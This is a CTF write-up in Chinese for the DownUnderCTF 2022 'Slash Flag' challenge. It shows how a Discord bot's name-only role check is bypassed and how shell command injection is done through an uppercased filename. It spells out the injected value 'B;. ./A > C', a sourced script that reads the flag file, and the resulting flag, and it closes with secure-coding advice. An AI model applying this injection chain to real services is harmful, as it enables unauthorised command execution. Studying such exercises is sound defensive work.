# DownUnderCTF 2022 Slash Flag Writeup

## 题目简述

题目是一个 Discord 文本存储 bot。只有拥有名为 `Organiser` 的角色才能使用 slash command，每个服务器在 nsjail 中有独立文件系统，flag 只读挂载在 `/flag/flag.txt`。`/create` 把文件名未经 shell quoting 直接拼进 Bash 命令，形成命令注入；文件名会被转成大写，需要额外绕过命令大小写问题。

## 解题过程

权限判断只比较角色名称：

```javascript
const isOrganiser = roles.some((name) => name === 'Organiser')
```

bot 是公开应用，可以把它加入自己的 Discord 服务器，自建并分配一个同名 `Organiser` 角色。这样无需取得官方服务器权限也能调用全局命令。

`/create` 的危险点在 `filename`：

```javascript
const filename = interaction.options.getString('filename').toUpperCase()
const text = quote(interaction.options.getString('text').split(' '))
await runCommand(`echo '${text}' > ${filename}`, interaction.guildId)
```

直接把 `cat /flag/flag.txt` 放进文件名会被转换为大写，Linux 上的 `CAT` 无法执行。可以先利用安全的 `text` 参数创建一个内容保持小写的脚本文件 `A`，再在文件名中只使用不区分大小写的文件名和 shell 内建命令 `.`：

```text
/create filename:A text:"cat /flag/flag.txt"
/create filename:"B;. ./A > C" text:whatever
/open filename:C
```

第二条命令拼接后近似为：

```bash
echo 'whatever' > B; . ./A > C
```

`.` 在当前 shell 中读取并执行文件 `A`，无需可执行权限；其中的小写 `cat /flag/flag.txt` 将 flag 写入 `C`。最后 `/open C` 调用受控的 `cat` 读取结果：

```text
DUCTF{/flag_didn't_work_for_me...}
```

## 方法总结

利用链先绕过跨服务器授权，再突破 shell 命令边界。按角色“名称”授权没有绑定可信 guild，公开 bot 因而可在攻击者自己的服务器获得同名角色；文件名虽然强制大写，却仍保留 `;`、重定向和 `.` 等控制语法。把真正区分大小写的命令写入文件，再用 shell 内建 source 执行，是绕过大写转换的关键。所有 shell 参数都应通过 argv 或严格引用传递，不能把用户文件名拼接到 `bash -c`。
